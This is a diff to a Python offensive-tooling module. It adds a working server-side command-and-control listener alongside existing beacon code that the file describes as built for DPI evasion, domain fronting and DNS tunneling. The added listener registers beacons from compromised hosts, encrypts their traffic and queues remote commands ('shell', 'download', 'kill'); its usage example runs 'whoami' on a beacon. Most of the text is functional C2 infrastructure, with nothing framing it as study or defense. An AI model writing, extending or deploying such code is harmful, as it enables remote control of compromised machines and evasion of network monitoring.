@@ -10,7 +10,9 @@ This module provides:
 - Traffic analysis evasion
 """
 
+import asyncio
 import base64
+import contextlib
 import hashlib
 import io
 import json
@@ -183,6 +185,14 @@ class JitterEngine:
         self.jitter_max = max_jitter
 
     def get_sleep_time(self) -> float:
+        """Calculate jittered beacon sleep interval.
+
+        Uses a triangular distribution simulation with ``secrets``
+        for human-like, DPI-resistant traffic timing.
+
+        Returns:
+            Sleep duration in seconds (minimum 0.1).
+        """
         # LOGIC FIX: Linear distribution is too easy for DPI to signature.
         # Using a primitive Triangular distribution simulation with secrets for "human-like" traffic.
         rng = self.jitter_max - self.jitter_min
@@ -199,6 +209,11 @@ class JitterEngine:
         return max(0.1, self.base_interval * factor)
 
     def update_interval(self, new: int) -> None:
+        """Update the base sleep interval.
+
+        Args:
+            new: New interval in seconds (clamped to minimum 1).
+        """
         self.base_interval = max(1, new)
 
 
@@ -1394,6 +1409,339 @@ class C2Channel:
             "domain_fronting": self.domain_fronter is not None,
             "dns_tunneling": self.dns_tunneler is not None,
             "heartbeat": self.heartbeat.get_status() if self.heartbeat else None,
+        }
+
+
+# =============================================================================
+# C2 LISTENER  (Server-Side)
+# =============================================================================
+
+
+@dataclass
+class BeaconSession:
+    """Tracked beacon session on the listener side.
+
+    Attributes:
+        beacon_id: Unique beacon identifier derived from first check-in.
+        remote_addr: IP address of the beacon.
+        first_seen: Epoch timestamp of initial check-in.
+        last_seen: Epoch timestamp of most recent check-in.
+        pending_commands: Queue of commands waiting to be sent to the beacon.
+        history: List of past command/response pairs.
+    """
+
+    beacon_id: str
+    remote_addr: str
+    first_seen: float = field(default_factory=time.time)
+    last_seen: float = field(default_factory=time.time)
+    pending_commands: list[BeaconMessage] = field(default_factory=list)
+    history: list[dict[str, Any]] = field(default_factory=list)
+
+    def enqueue(self, command: str, data: dict[str, Any] | None = None) -> str:
+        """Queue a command for delivery on next check-in.
+
+        Args:
+            command: Command verb (``shell``, ``download``, ``sleep``, ``kill``).
+            data: Optional parameters for the command.
+
+        Returns:
+            The ``message_id`` of the queued command.
+        """
+        msg_id = hashlib.sha256(
+            f"{time.time()}{secrets.randbelow(1_000_000)}".encode(),
+        ).hexdigest()[:16]
+        self.pending_commands.append(
+            BeaconMessage(message_id=msg_id, command=command, data=data),
+        )
+        return msg_id
+
+    def to_dict(self) -> dict[str, Any]:
+        """Serialise session metadata to a plain dict."""
+        return {
+            "beacon_id": self.beacon_id,
+            "remote_addr": self.remote_addr,
+            "first_seen": self.first_seen,
+            "last_seen": self.last_seen,
+            "pending": len(self.pending_commands),
+            "history_count": len(self.history),
+        }
+
+
+class C2Listener:
+    """Server-side C2 listener that accepts beacon check-ins.
+
+    Provides:
+    - HTTPS / HTTP listener via :mod:`asyncio` + :mod:`ssl`
+    - Per-beacon session management (register, task queue, history)
+    - AES-256-GCM encrypted communication (shared key with beacons)
+    - Operator API: ``queue_command``, ``get_sessions``, ``get_session_history``
+
+    Usage::
+
+        listener = C2Listener(host="0.0.0.0", port=443, encryption_key=key)
+        await listener.start()          # begins accepting beacons
+        listener.queue_command(bid, "shell", {"cmd": "whoami"})
+        await listener.stop()
+
+    :param host: Bind address (default ``0.0.0.0``).
+    :param port: Bind port (default ``443``).
+    :param encryption_key: 32-byte AES key shared with beacons.
+    :param use_tls: Whether to wrap the socket in TLS (default ``True``).
+    :param certfile: Path to PEM certificate file for TLS.
+    :param keyfile: Path to PEM private-key file for TLS.
+    """
+
+    def __init__(
+        self,
+        host: str = "0.0.0.0",
+        port: int = 443,
+        encryption_key: bytes | None = None,
+        *,
+        use_tls: bool = True,
+        certfile: str | None = None,
+        keyfile: str | None = None,
+    ) -> None:
+        self.host = host
+        self.port = port
+        self.use_tls = use_tls
+        self.certfile = certfile
+        self.keyfile = keyfile
+        self.encryption_key = encryption_key or os.urandom(32)
+
+        self._sessions: dict[str, BeaconSession] = {}
+        self._server: asyncio.Server | None = None
+        self._running = False
+
+        logger.info("C2Listener initialised on %s:%d (TLS=%s)", host, port, use_tls)
+
+    # ------------------------------------------------------------------
+    # Session management
+    # ------------------------------------------------------------------
+
+    def get_sessions(self) -> dict[str, dict[str, Any]]:
+        """Return a mapping of all tracked beacon sessions."""
+        return {bid: s.to_dict() for bid, s in self._sessions.items()}
+
+    def get_session(self, beacon_id: str) -> BeaconSession | None:
+        """Return a single session by its beacon ID, or ``None``."""
+        return self._sessions.get(beacon_id)
+
+    def get_session_history(self, beacon_id: str) -> list[dict[str, Any]]:
+        """Return the command/response history for *beacon_id*."""
+        session = self._sessions.get(beacon_id)
+        return session.history if session else []
+
+    def queue_command(
+        self,
+        beacon_id: str,
+        command: str,
+        data: dict[str, Any] | None = None,
+    ) -> str | None:
+        """Add a command to the beacon's pending queue.
+
+        Args:
+            beacon_id: Target beacon identifier.
+            command: Command verb.
+            data: Optional parameters.
+
+        Returns:
+            The ``message_id`` if the session exists, else ``None``.
+        """
+        session = self._sessions.get(beacon_id)
+        if session is None:
+            logger.warning("queue_command: unknown beacon %s", beacon_id)
+            return None
+        return session.enqueue(command, data)
+
+    # ------------------------------------------------------------------
+    # Encryption helpers (mirrors C2Channel)
+    # ------------------------------------------------------------------
+
+    def _encrypt(self, data: bytes) -> bytes:
+        """Encrypt *data* with AES-256-GCM and return base64-encoded blob."""
+        from Crypto.Cipher import AES
+
+        key = hashlib.sha256(self.encryption_key).digest()
+        nonce = os.urandom(12)
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        ciphertext, tag = cipher.encrypt_and_digest(data)
+        return base64.b64encode(nonce + tag + ciphertext)
+
+    def _decrypt(self, data: bytes) -> bytes:
+        """Decrypt AES-256-GCM base64-encoded *data*."""
+        from Crypto.Cipher import AES
+
+        try:
+            decoded = base64.b64decode(data)
+            key = hashlib.sha256(self.encryption_key).digest()
+            nonce = decoded[:12]
+            tag = decoded[12:28]
+            ciphertext = decoded[28:]
+            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+            return cipher.decrypt_and_verify(ciphertext, tag)
+        except Exception as exc:
+            logger.exception("Listener decryption failed: %s", exc)
+            return b""
+
+    # ------------------------------------------------------------------
+    # Request handling
+    # ------------------------------------------------------------------
+
+    async def _handle_request(
+        self,
+        reader: asyncio.StreamReader,
+        writer: asyncio.StreamWriter,
+    ) -> None:
+        """Handle a single inbound HTTP(S) beacon request.
+
+        Protocol (simplified HTTP/1.1):
+        1. Read ``POST /api/beacon HTTP/1.1`` request line + headers.
+        2. Read encrypted body.
+        3. Decrypt → JSON: ``{"id": …, "cmd": "checkin", "data": …}``.
+        4. Register / update beacon session.
+        5. Pop next pending command (if any) and send encrypted response.
+        """
+        peer = writer.get_extra_info("peername", ("?", 0))
+        try:
+            # -- Read HTTP request line + headers --------------------------
+            request_line = await asyncio.wait_for(reader.readline(), timeout=30)
+            if not request_line:
+                return
+            headers: dict[str, str] = {}
+            while True:
+                header_line = await asyncio.wait_for(reader.readline(), timeout=10)
+                if header_line in (b"\r\n", b"\n", b""):
+                    break
+                decoded = header_line.decode(errors="replace").strip()
+                if ":" in decoded:
+                    k, v = decoded.split(":", 1)
+                    headers[k.strip().lower()] = v.strip()
+
+            content_length = int(headers.get("content-length", "0"))
+            body = b""
+            if content_length > 0:
+                body = await asyncio.wait_for(
+                    reader.readexactly(content_length),
+                    timeout=30,
+                )
+
+            # -- Decrypt & parse -------------------------------------------
+            plaintext = self._decrypt(body) if body else b"{}"
+            try:
+                payload = json.loads(plaintext)
+            except (json.JSONDecodeError, UnicodeDecodeError):
+                payload = {}
+
+            beacon_id = payload.get("id", hashlib.sha256(
+                f"{peer[0]}:{time.time()}".encode(),
+            ).hexdigest()[:16])
+            command = payload.get("cmd", "checkin")
+
+            # -- Session bookkeeping ---------------------------------------
+            if beacon_id not in self._sessions:
+                self._sessions[beacon_id] = BeaconSession(
+                    beacon_id=beacon_id,
+                    remote_addr=str(peer[0]),
+                )
+                logger.info(
+                    "New beacon registered: %s from %s", beacon_id, peer[0],
+                )
+            session = self._sessions[beacon_id]
+            session.last_seen = time.time()
+
+            # Store incoming data in history
+            if command != "checkin" or payload.get("data"):
+                session.history.append({
+                    "direction": "in",
+                    "command": command,
+                    "data": payload.get("data"),
+                    "ts": time.time(),
+                })
+
+            # -- Build response --------------------------------------------
+            response_data: dict[str, Any] = {"id": beacon_id, "status": "ok"}
+            if session.pending_commands:
+                next_cmd = session.pending_commands.pop(0)
+                response_data["cmd"] = next_cmd.command
+                response_data["data"] = next_cmd.data
+                session.history.append({
+                    "direction": "out",
+                    "command": next_cmd.command,
+                    "data": next_cmd.data,
+                    "msg_id": next_cmd.message_id,
+                    "ts": time.time(),
+                })
+
+            encrypted_response = self._encrypt(
+                json.dumps(response_data).encode(),
+            )
+
+            # -- Send HTTP response ----------------------------------------
+            http_response = (
+                b"HTTP/1.1 200 OK\r\n"
+                b"Content-Type: application/octet-stream\r\n"
+                b"Content-Length: " + str(len(encrypted_response)).encode() + b"\r\n"
+                b"Connection: close\r\n"
+                b"\r\n"
+                + encrypted_response
+            )
+            writer.write(http_response)
+            await writer.drain()
+
+        except OSError as exc:
+            logger.debug("Listener connection error from %s: %s", peer, exc)
+        finally:
+            writer.close()
+            with contextlib.suppress(Exception):
+                await writer.wait_closed()
+
+    # ------------------------------------------------------------------
+    # Lifecycle
+    # ------------------------------------------------------------------
+
+    async def start(self) -> None:
+        """Start the C2 listener and begin accepting beacon connections."""
+        ssl_ctx: ssl.SSLContext | None = None
+        if self.use_tls and self.certfile and self.keyfile:
+            ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            ssl_ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+            ssl_ctx.load_cert_chain(self.certfile, self.keyfile)
+
+        self._server = await asyncio.start_server(
+            self._handle_request,
+            host=self.host,
+            port=self.port,
+            ssl=ssl_ctx,
+        )
+        self._running = True
+        logger.info(
+            "C2 Listener started on %s:%d (TLS=%s)",
+            self.host, self.port, self.use_tls and ssl_ctx is not None,
+        )
+
+    async def stop(self) -> None:
+        """Gracefully stop the listener."""
+        self._running = False
+        if self._server:
+            self._server.close()
+            await self._server.wait_closed()
+            self._server = None
+        logger.info("C2 Listener stopped")
+
+    @property
+    def running(self) -> bool:
+        """Whether the listener is currently accepting connections."""
+        return self._running
+
+    def get_status(self) -> dict[str, Any]:
+        """Return listener status summary."""
+        return {
+            "running": self._running,
+            "host": self.host,
+            "port": self.port,
+            "use_tls": self.use_tls,
+            "active_beacons": len(self._sessions),
+            "sessions": self.get_sessions(),
         }
 
 
